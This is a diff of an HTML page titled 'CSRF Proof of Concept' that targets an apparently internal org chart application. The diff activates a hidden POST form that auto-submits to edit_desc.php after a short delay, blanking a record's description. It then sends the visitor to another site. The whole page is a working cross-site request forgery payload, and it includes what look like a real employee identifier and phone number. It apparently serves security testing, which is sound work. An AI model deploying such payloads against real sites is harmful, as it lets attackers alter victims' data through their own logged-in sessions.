@@ -5,20 +5,20 @@
 </head>
 <body>
     <h1>CSRF Proof of Concept</h1>
-    <!--<form action="https://orgchart/edit_desc.php" method="POST" id="csrfForm">
+    <form action="https://orgchart/edit_desc.php" method="POST" id="csrfForm">
         <input type="hidden" name="sso" value="212628051">
-        <input type="hidden" name="desc" value="Našel CSRF v orgchartu.">
-        <input type="hidden" name="table" value="6C6/5">
+        <input type="hidden" name="desc" value="">
+        <input type="hidden" name="table" value="6C6/78">
         <input type="hidden" name="mobile" value="+420720843234">
-    </form>-->
+    </form>
     <script>
         // Open the org chart in a new tab or window
-        window.open('https://orgchart/', '_blank');
-        window.location.href = 'https://example.com';
+        window.open('https://orgchart/', '_blank');        
         // Submit the CSRF form after a short delay to ensure the new window opens first
-        //setTimeout(() => {
-        //    document.getElementById('csrfForm').submit();
-        //}, 500); // 500ms delay
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 400); // 500ms delay
+        window.location.href = 'https://example.com';
     </script>
 </body>
 </html>
